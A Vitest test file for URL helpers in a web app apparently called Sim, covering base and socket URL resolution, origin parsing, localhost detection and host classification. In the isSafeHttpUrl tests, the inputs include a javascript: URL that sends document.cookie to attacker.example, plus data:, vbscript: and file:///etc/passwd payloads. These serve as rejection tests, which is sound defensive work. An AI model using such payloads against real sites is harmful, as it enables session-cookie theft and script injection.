/**
 * @vitest-environment jsdom
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const { mockGetEnv } = vi.hoisted(() => ({
  mockGetEnv: vi.fn<(key: string) => string | undefined>(),
}))

vi.unmock('@/lib/core/utils/urls')
vi.mock('@/lib/core/config/env', () => ({
  env: {},
  getEnv: mockGetEnv,
}))

import {
  getBaseUrl,
  getBrowserOrigin,
  getSocketUrl,
  isLocalhostUrl,
  isNonCanonicalSimHost,
  isSafeHttpUrl,
  parseOriginList,
} from '@/lib/core/utils/urls'

function setLocation(url: string) {
  Object.defineProperty(window, 'location', {
    value: new URL(url),
    writable: true,
    configurable: true,
  })
}

describe('getBrowserOrigin', () => {
  it('returns the page origin in the browser', () => {
    setLocation('https://example.com/some/path')
    expect(getBrowserOrigin()).toBe('https://example.com')
  })
})

describe('getBaseUrl', () => {
  beforeEach(() => {
    mockGetEnv.mockReset()
    mockGetEnv.mockReturnValue(undefined)
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  it('uses NEXT_PUBLIC_APP_URL when set', () => {
    mockGetEnv.mockImplementation((key) =>
      key === 'NEXT_PUBLIC_APP_URL' ? 'https://app.example.com' : undefined
    )
    setLocation('https://other.example.com/workspace/w/1')
    expect(getBaseUrl()).toBe('https://app.example.com')
  })

  /**
   * Call sites build `${getBaseUrl()}/path`, so a trailing slash would give them
   * a `//path` pathname that matches no route — and would break the
   * `startsWith(`${base}/`)` prefix checks that decide whether a redirect target
   * is our own, silently sending those redirects to their fallback instead.
   */
  it('strips trailing slashes so concatenated paths stay single-slashed', () => {
    for (const configured of ['https://app.example.com/', 'https://app.example.com///']) {
      mockGetEnv.mockImplementation((key) =>
        key === 'NEXT_PUBLIC_APP_URL' ? configured : undefined
      )
      expect(getBaseUrl()).toBe('https://app.example.com')
      expect(new URL(`${getBaseUrl()}/desktop/connect/complete`).pathname).toBe(
        '/desktop/connect/complete'
      )
    }
  })

  /**
   * Pins the trim's shape — it must not eat more than the trailing slashes.
   * Not a claim that a path-prefixed deployment works: the app declares no Next
   * `basePath`, so such a value could not address its routes either way.
   */
  it('trims only trailing slashes, never interior ones', () => {
    mockGetEnv.mockImplementation((key) =>
      key === 'NEXT_PUBLIC_APP_URL' ? 'https://example.com/a/b/' : undefined
    )
    expect(getBaseUrl()).toBe('https://example.com/a/b')
  })

  it('adds the protocol and strips the trailing slash together', () => {
    mockGetEnv.mockImplementation((key) =>
      key === 'NEXT_PUBLIC_APP_URL' ? 'app.example.com/' : undefined
    )
    expect(getBaseUrl()).toBe('http://app.example.com')
  })

  /**
   * Never guesses from `window.location.origin`: an opaque origin (a sandboxed
   * iframe) serializes to the truthy string `'null'`, which would silently
   * produce `null/api/...` rather than surfacing the misconfiguration.
   */
  it('throws in the browser rather than guessing from the page origin', () => {
    setLocation('https://www.sim.ai/workspace/ws-1/w/wf-1')
    expect(() => getBaseUrl()).toThrow('NEXT_PUBLIC_APP_URL must be configured')
  })

  it('treats a whitespace-only NEXT_PUBLIC_APP_URL as unset', () => {
    mockGetEnv.mockImplementation((key) => (key === 'NEXT_PUBLIC_APP_URL' ? '   ' : undefined))
    setLocation('https://www.sim.ai/')
    expect(() => getBaseUrl()).toThrow('NEXT_PUBLIC_APP_URL must be configured')
  })
})

describe('getSocketUrl', () => {
  beforeEach(() => {
    mockGetEnv.mockReset()
    mockGetEnv.mockReturnValue(undefined)
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  it('uses NEXT_PUBLIC_SOCKET_URL when explicitly set', () => {
    mockGetEnv.mockImplementation((key) =>
      key === 'NEXT_PUBLIC_SOCKET_URL' ? 'https://socket.example.com' : undefined
    )
    setLocation('https://app.example.com/')
    expect(getSocketUrl()).toBe('https://socket.example.com')
  })

  it('returns the page origin when served from a non-localhost host', () => {
    setLocation('https://10.0.3.36/signup')
    expect(getSocketUrl()).toBe('https://10.0.3.36')
  })

  it('falls back to localhost:3002 when served from localhost', () => {
    setLocation('http://localhost:3000/')
    expect(getSocketUrl()).toBe('http://localhost:3002')
  })

  it('falls back to localhost:3002 when served from 127.0.0.1', () => {
    setLocation('http://127.0.0.1:3000/')
    expect(getSocketUrl()).toBe('http://localhost:3002')
  })

  it('explicit env var wins over the localhost fallback', () => {
    mockGetEnv.mockImplementation((key) =>
      key === 'NEXT_PUBLIC_SOCKET_URL' ? 'http://realtime.local:3002' : undefined
    )
    setLocation('http://localhost:3000/')
    expect(getSocketUrl()).toBe('http://realtime.local:3002')
  })

  it('treats whitespace-only env var as unset', () => {
    mockGetEnv.mockImplementation((key) => (key === 'NEXT_PUBLIC_SOCKET_URL' ? '   ' : undefined))
    setLocation('https://app.example.com/')
    expect(getSocketUrl()).toBe('https://app.example.com')
  })
})

describe('parseOriginList', () => {
  it('returns an empty array for undefined, null, or empty input', () => {
    expect(parseOriginList(undefined)).toEqual([])
    expect(parseOriginList(null)).toEqual([])
    expect(parseOriginList('')).toEqual([])
    expect(parseOriginList('   ')).toEqual([])
  })

  it('parses comma-separated origins and normalizes them', () => {
    expect(parseOriginList('https://a.example.com, https://b.example.com/path')).toEqual([
      'https://a.example.com',
      'https://b.example.com',
    ])
  })

  it('dedupes equal origins after normalization', () => {
    expect(
      parseOriginList('https://a.example.com,https://a.example.com/foo,https://a.example.com')
    ).toEqual(['https://a.example.com'])
  })

  it('drops invalid entries and reports them via the callback', () => {
    const invalid: string[] = []
    const result = parseOriginList('https://ok.example.com, not-a-url, ', (v) => invalid.push(v))
    expect(result).toEqual(['https://ok.example.com'])
    expect(invalid).toEqual(['not-a-url'])
  })

  it('preserves non-default ports in the origin', () => {
    expect(parseOriginList('http://10.0.3.36:8080')).toEqual(['http://10.0.3.36:8080'])
  })
})

describe('isLocalhostUrl', () => {
  it('matches localhost variants', () => {
    expect(isLocalhostUrl('http://localhost:3000')).toBe(true)
    expect(isLocalhostUrl('http://127.0.0.1')).toBe(true)
    expect(isLocalhostUrl('https://localhost')).toBe(true)
  })

  it('does not match public hostnames or invalid URLs', () => {
    expect(isLocalhostUrl('https://10.0.3.36')).toBe(false)
    expect(isLocalhostUrl('https://app.example.com')).toBe(false)
    expect(isLocalhostUrl('not-a-url')).toBe(false)
    expect(isLocalhostUrl('')).toBe(false)
  })
})

describe('isSafeHttpUrl', () => {
  it('allows absolute http(s) URLs', () => {
    expect(isSafeHttpUrl('https://example.com/file.pdf')).toBe(true)
    expect(isSafeHttpUrl('http://example.com/file.pdf')).toBe(true)
  })

  it('allows same-origin relative URLs (resolved against the browser origin)', () => {
    expect(isSafeHttpUrl('/api/files/serve/abc?context=execution')).toBe(true)
  })

  it('rejects javascript: URLs', () => {
    expect(isSafeHttpUrl("javascript:fetch('//attacker.example/c?'+document.cookie)")).toBe(false)
    expect(isSafeHttpUrl('JavaScript:alert(1)')).toBe(false)
  })

  it('rejects other script-capable or non-navigable schemes', () => {
    expect(isSafeHttpUrl('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isSafeHttpUrl('vbscript:msgbox(1)')).toBe(false)
    expect(isSafeHttpUrl('blob:https://example.com/uuid')).toBe(false)
    expect(isSafeHttpUrl('file:///etc/passwd')).toBe(false)
  })

  it('treats relative junk as same-origin http (safe) rather than throwing', () => {
    expect(isSafeHttpUrl('')).toBe(true)
    expect(isSafeHttpUrl('not a url')).toBe(true)
  })

  it('rejects unparseable absolute input without throwing', () => {
    expect(isSafeHttpUrl('http://')).toBe(false)
  })
})

describe('isNonCanonicalSimHost', () => {
  it.each(['www.sim.ai', 'sim.ai', 'WWW.SIM.AI', 'www.sim.ai:443'])(
    'treats %s as the canonical marketing site',
    (host) => {
      expect(isNonCanonicalSimHost(host)).toBe(false)
    }
  )

  it.each(['dev.sim.ai', 'www.dev.sim.ai', 'staging.sim.ai', 'prod.sockets.sim.ai'])(
    'treats %s as non-canonical',
    (host) => {
      expect(isNonCanonicalSimHost(host)).toBe(true)
    }
  )

  it.each(['sim.example.com', 'localhost:3000', 'notsim.ai', 'sim.ai.evil.com'])(
    'leaves %s alone',
    (host) => {
      expect(isNonCanonicalSimHost(host)).toBe(false)
    }
  )

  it.each(['www.sim.ai, dev.sim.ai', 'sim.ai,dev.sim.ai', '  www.sim.ai , staging.sim.ai'])(
    'classifies a comma-joined forwarded host by its first entry (%s)',
    (host) => {
      expect(isNonCanonicalSimHost(host)).toBe(false)
    }
  )

  it('still flags a comma-joined host whose first entry is non-canonical', () => {
    expect(isNonCanonicalSimHost('dev.sim.ai, www.sim.ai')).toBe(true)
  })

  it('does not throw on an empty host', () => {
    expect(isNonCanonicalSimHost('')).toBe(false)
  })
})
